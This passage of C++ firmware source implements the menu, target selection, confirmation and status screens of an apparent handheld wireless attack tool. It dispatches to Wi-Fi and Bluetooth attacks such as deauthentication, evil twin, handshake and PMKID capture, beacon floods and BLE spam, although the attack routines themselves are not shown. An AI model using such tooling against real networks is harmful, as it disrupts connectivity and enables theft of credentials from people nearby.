        case TARGET_SELECT: {
            buttonNavigator.onNext([this] {
                if (targetCount > 0) {
                    targetIndex = ButtonNavigator::nextIndex(targetIndex, targetCount);
                    requestUpdate();
                }
            });
            buttonNavigator.onPrevious([this] {
                if (targetCount > 0) {
                    targetIndex = ButtonNavigator::previousIndex(targetIndex, targetCount);
                    requestUpdate();
                }
            });
            if (mappedInput.wasReleased(MappedInputManager::Button::Confirm) && targetCount > 0) {
                target = targetList[targetIndex];
                if (target) {
                    memcpy(targetMac, target->mac, 6);
                    buildAttackMenu();  // rebuild filtered to target type

                    // Find the pending attack in the rebuilt menu
                    attackIndex = 0;
                    for (int i = 0; i < availableCount; i++) {
                        if (attacks[i].type == pendingAttack) {
                            attackIndex = i;
                            break;
                        }
                    }
                    pendingAttack = ATK_COUNT;

                    if (attackIndex < availableCount && attacks[attackIndex].available) {
                        state = CONFIRM;
                    } else {
                        state = ATTACK_SELECT;
                    }
                    requestUpdate();
                }
            }
            if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
                pendingAttack = ATK_COUNT;
                state = ATTACK_SELECT;
                requestUpdate();
            }
            break;
        }

        case ATTACK_SELECT: {
            buttonNavigator.onNext([this] {
                if (availableCount > 0) {
                    attackIndex = ButtonNavigator::nextIndex(attackIndex, availableCount);
                    requestUpdate();
                }
            });
            buttonNavigator.onPrevious([this] {
                if (availableCount > 0) {
                    attackIndex = ButtonNavigator::previousIndex(attackIndex, availableCount);
                    requestUpdate();
                }
            });
            if (mappedInput.wasReleased(MappedInputManager::Button::Confirm) && availableCount > 0) {
                if (attacks[attackIndex].available) {
                    state = CONFIRM;
                    requestUpdate();
                } else {
                    pendingAttack = attacks[attackIndex].type;
                    state = TARGET_SELECT;
                    loadTargetList();
                    requestUpdate();
                }
            }
            if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
                finish();
            }
            break;
        }

        case CONFIRM: {
            if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
                AttackType selectedAttack = attacks[attackIndex].type;
                // Attacks that are not universal always need a target — refuse to
                // start if none is selected rather than crashing in the tick function.
                if (!isUniversalAttack(selectedAttack) && !target) {
                    pendingAttack = selectedAttack;
                    state = TARGET_SELECT;
                    loadTargetList();
                    requestUpdate();
                } else {
                    startAttack();
                }
            }
            if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
                state = ATTACK_SELECT;
                requestUpdate();
            }
            break;
        }

        case EXECUTING: {
            // Run attack tick
            switch (activeAttack) {
                case ATK_DEAUTH_BROADCAST:  tickDeauthBroadcast(); break;
                case ATK_DEAUTH_TARGETED:   tickDeauthTargeted(); break;
                case ATK_ROGUE_AP:          tickRogueAp(); break;
                case ATK_HANDSHAKE_CAPTURE: tickHandshakeCapture(); break;
                case ATK_PMKID_HARVEST:     tickPmkidHarvest(); break;
                case ATK_BEACON_FLOOD:      tickBeaconFlood(); break;
                case ATK_AUTH_FLOOD:        tickAuthFlood(); break;
                case ATK_KARMA_AP:          tickKarmaAp(); break;
                case ATK_EVIL_TWIN:         tickEvilTwin(); break;
                case ATK_BLE_CLONE:         tickBleClone(); break;
                case ATK_BLE_SPAM:          tickBleSpam(); break;
                case ATK_BLE_ENUMERATE:     tickBleEnumerate(); break;
                case ATK_AIRTAG_SWARM:      tickAirtagSwarm(); break;
                default: break;
            }

            // Display throttle
            unsigned long now = millis();
            if (now - lastDisplayMs >= 500) {
                lastDisplayMs = now;
                requestUpdate();
            }

            // Back = stop
            if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
                stopAttack();
                state = RESULTS;
                snprintf(resultLine, sizeof(resultLine), "Stopped. %lu packets sent.",
                         (unsigned long)packetsSent);
                requestUpdate();
            }
            break;
        }

        case RESULTS: {
            if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
                state = ATTACK_SELECT;
                requestUpdate();
            }
            if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
                // Run again
                state = CONFIRM;
                requestUpdate();
            }
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Render
// ---------------------------------------------------------------------------

void FireActivity::render(RenderLock&&) {
    renderer.clearScreen();

    switch (state) {
        case TARGET_SELECT:  renderTargetSelect(); break;
        case ATTACK_SELECT:  renderAttackSelect(); break;
        case CONFIRM:        renderConfirm(); break;
        case EXECUTING:      renderExecuting(); break;
        case RESULTS:        renderResults(); break;
    }

    renderer.displayBuffer();
}

void FireActivity::renderTargetSelect() const {
    const auto& metrics = UITheme::getInstance().getMetrics();
    const auto pageWidth = renderer.getScreenWidth();
    const auto pageHeight = renderer.getScreenHeight();

    const char* headerText = "FIRE — Select target";
    if (pendingAttack < ATK_COUNT) {
        if (requiredTargetType(pendingAttack) == TargetType::BLE)
            headerText = "FIRE — Select BLE device";
        else
            headerText = "FIRE — Select WiFi AP";
    }
    GUI.drawHeader(renderer,
        Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
        headerText);

    const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
    const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;

    if (targetCount == 0) {
        renderer.drawCenteredText(UI_10_FONT_ID, contentTop + contentHeight / 2 - 10,
                                   "No targets in database.");
        renderer.drawCenteredText(SMALL_FONT_ID, contentTop + contentHeight / 2 + 15,
                                   "Run SCAN first to discover targets.");
    } else {
        GUI.drawList(renderer,
            Rect{0, contentTop, pageWidth, contentHeight},
            targetCount, targetIndex,
            [this](int i) -> std::string {
                if (!targetList[i]) return "";
                const Target* t = targetList[i];
                char buf[48];
                const char* pre = t->type == TargetType::AP ? "[AP] " :
                                  t->type == TargetType::STA ? "[CL] " : "[BT] ";
                const char* label = t->ssid[0] ? t->ssid : t->name[0] ? t->name : "Unknown";
                snprintf(buf, sizeof(buf), "%s%s", pre, label);
                return std::string(buf);
            },
            [this](int i) -> std::string {
                if (!targetList[i]) return "";
                bool stale = !TARGETS.isSeenThisSession(targetList[i]);
                char buf[56];
                snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %s%d",
                         targetList[i]->mac[0], targetList[i]->mac[1], targetList[i]->mac[2],
                         targetList[i]->mac[3], targetList[i]->mac[4], targetList[i]->mac[5],
                         stale ? "OLD " : "RSSI ",
                         (int)targetList[i]->rssi);
                return std::string(buf);
            });
    }

    const auto labels = mappedInput.mapLabels("Back", "Select", "^", "v");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
}

void FireActivity::renderAttackSelect() const {
    const auto& metrics = UITheme::getInstance().getMetrics();
    const auto pageWidth = renderer.getScreenWidth();
    const auto pageHeight = renderer.getScreenHeight();

    char title[48];
    if (target) {
        snprintf(title, sizeof(title), "FIRE — %s",
                 target->ssid[0] ? target->ssid :
                 target->name[0] ? target->name : "device");
    } else {
        snprintf(title, sizeof(title), "FIRE — no target");
    }

    GUI.drawHeader(renderer,
        Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, title);

    const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
    const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;

    GUI.drawList(renderer,
        Rect{0, contentTop, pageWidth, contentHeight},
        availableCount, attackIndex,
        [this](int i) -> std::string {
            if (i >= availableCount) return "";
            char buf[48];
            snprintf(buf, sizeof(buf), "%s%s",
                     attacks[i].available ? "" : "[X] ",
                     attacks[i].name);
            return std::string(buf);
        },
        [this](int i) -> std::string {
            if (i >= availableCount) return "";
            return std::string(attacks[i].desc);
        });

    const auto labels = mappedInput.mapLabels("Back", "Select", "^", "v");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
}

void FireActivity::renderConfirm() const {
    const auto& metrics = UITheme::getInstance().getMetrics();
    const auto pageWidth = renderer.getScreenWidth();
    const auto pageHeight = renderer.getScreenHeight();

    GUI.drawHeader(renderer,
        Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
        "FIRE — Confirm");

    const int cy = pageHeight / 2;
    renderer.drawCenteredText(UI_12_FONT_ID, cy - 40,
                               attacks[attackIndex].name, true, EpdFontFamily::BOLD);
    renderer.drawCenteredText(UI_10_FONT_ID, cy - 10, attacks[attackIndex].desc);

    char targetStr[64];
    if (target) {
        snprintf(targetStr, sizeof(targetStr), "Target: %s",
                 target->ssid[0] ? target->ssid :
                 target->name[0] ? target->name : "Unknown");
    } else {
        snprintf(targetStr, sizeof(targetStr), "Target: broadcast (no target)");
    }
    renderer.drawCenteredText(SMALL_FONT_ID, cy + 20, targetStr);

    renderer.drawCenteredText(SMALL_FONT_ID, cy + 60, "Press Confirm to execute.");

    const auto labels = mappedInput.mapLabels("Cancel", "Execute", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
}

void FireActivity::renderExecuting() const {
    const auto& metrics = UITheme::getInstance().getMetrics();
    const auto pageWidth = renderer.getScreenWidth();
    const auto pageHeight = renderer.getScreenHeight();

    GUI.drawHeader(renderer,
        Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
        "FIRE — ACTIVE");

    const int cy = pageHeight / 2 - 20;

    renderer.drawCenteredText(UI_12_FONT_ID, cy - 30,
                               attacks[attackIndex].name, true, EpdFontFamily::BOLD);

    // Elapsed time
    unsigned long elapsed = (millis() - attackStartMs) / 1000;
    char timeBuf[32];
    snprintf(timeBuf, sizeof(timeBuf), "%lum %lus", elapsed / 60, elapsed % 60);
    renderer.drawCenteredText(UI_10_FONT_ID, cy, timeBuf);

    // Packets
    char pktBuf[32];
    snprintf(pktBuf, sizeof(pktBuf), "Packets: %lu", (unsigned long)packetsSent);
    renderer.drawCenteredText(UI_10_FONT_ID, cy + 25, pktBuf);

    // Status line
    if (statusLine[0]) {
        renderer.drawCenteredText(SMALL_FONT_ID, cy + 55, statusLine);
    }

    const auto labels = mappedInput.mapLabels("Stop", "", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
}

void FireActivity::renderResults() const {
    const auto& metrics = UITheme::getInstance().getMetrics();
    const auto pageWidth = renderer.getScreenWidth();
    const auto pageHeight = renderer.getScreenHeight();

    GUI.drawHeader(renderer,
        Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
        "FIRE — Results");

    const int cy = pageHeight / 2 - 20;

    renderer.drawCenteredText(UI_12_FONT_ID, cy - 30,
                               attacks[attackIndex].name, true, EpdFontFamily::BOLD);

    char pktBuf[48];
    snprintf(pktBuf, sizeof(pktBuf), "Total packets: %lu", (unsigned long)packetsSent);
    renderer.drawCenteredText(UI_10_FONT_ID, cy, pktBuf);

    // Result details (may be multi-line, but we draw single for now)
    if (resultLine[0]) {
        renderer.drawCenteredText(SMALL_FONT_ID, cy + 30, resultLine);
    }

    const auto labels = mappedInput.mapLabels("Back", "Repeat", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
}
